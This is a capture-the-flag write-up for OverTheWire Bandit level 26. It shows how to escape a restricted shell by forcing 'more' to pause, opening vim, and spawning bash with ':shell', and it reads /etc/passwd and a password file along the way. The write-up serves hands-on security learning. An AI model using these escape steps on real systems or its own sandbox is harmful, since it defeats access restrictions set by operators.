# URL
https://overthewire.org/wargames/bandit/bandit26.html

# Concepts
* Figuring out what shell other users have access to
* Figuring how to break out of said shell
  
# Method of Solve
* Connected to bandit25
  ```bash
  ssh bandit25@bandit.labs.overthewire.org -p 2220
  ```
* Used cat to figure out the shell bandit26 has access to
  ```bash
  cat /etc/passwd | grep bandit26
  ```
* Determined bandit26 uses /usr/bin/showtext
* /usr/bin/showtext belongs to u: root g: root and permissions of 755
  ```bash
  ls -l /usr/bin | grep showtext
  ```
* showtext shows the following
  ```bash
  #!/bin/sh

  export TERM=linux

  exec more ~/text.txt
  exit 0
  ```
* Found bandit26.sshkey in my home directory, I copied it to my machine 
* I installed gnome-terminal and started a terminal using
  ```bash
  gnome-terminal --geometry 80x4
  ```
* I then attempted to log on using the bandit26.sshkey I acquired using the smaller terminal
* It successfully logged on and immediately prompted me for more (remember that bandit26 defaulted to more)
* Pressed v to get me into VIM one of the features of more
* Since VIM allows us to run system commands, I was able to
  ```bash
  :shell /bin/bash
  :shell
  ```
* This created a full bash shell as bandit 26, which gave me access to the /etc/bandit_pass/bandit26 file
